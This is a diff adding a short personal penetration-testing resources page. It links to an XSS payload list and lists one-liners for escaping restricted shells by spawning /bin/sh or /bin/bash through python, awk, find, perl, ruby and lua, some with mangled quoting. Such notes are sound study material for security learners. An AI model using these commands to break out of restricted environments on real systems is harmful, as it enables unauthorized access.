@@ -1,0 +1,27 @@
+I"�<h1 id="resources"><a href="#header-1"></a>Resources</h1>
+
+<p>A list of resources i have gathered throughout my journey listed here for easy reference. I have tried to give credit where i can however if anything is missing
+or is wrong please let me know, Allot of these have come from my notes pasted into Cherry Tree and ive long since lost the original page..</p>
+
+<p>(In no particular order yet!)</p>
+
+<hr />
+
+<p><a href="https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt">XSS Payloads</a> (Top 20 are the standard ‘go-to’ to try first.)</p>
+
+<p>Escaping limited shells:~</p>
+<blockquote>
+  <p>-c ‘import pty;pty.spawn(“/bin/bash”)’ 
+           echo os.system(‘/bin/bash’)
+            /bin/sh -i
+            awk ‘BEGIN {system(“/bin/sh”)}’
+            find / -name blahblah ‘exec /bin/awk ‘BEGIN {system(“/bin/sh”)}’ \;
+            python: exit_code = os.system(‘/bin/sh’) output = os.popen(‘/bin/sh’).read()
+            perl -e ‘exec “/bin/sh”;’
+            perl: exec “/bin/sh”;
+            ruby: exec “/bin/sh”
+            lua: os.execute(‘/bin/sh’)
+            irb(main:001:0&gt; exec “/bin/sh”</p>
+
+</blockquote>
+:ET
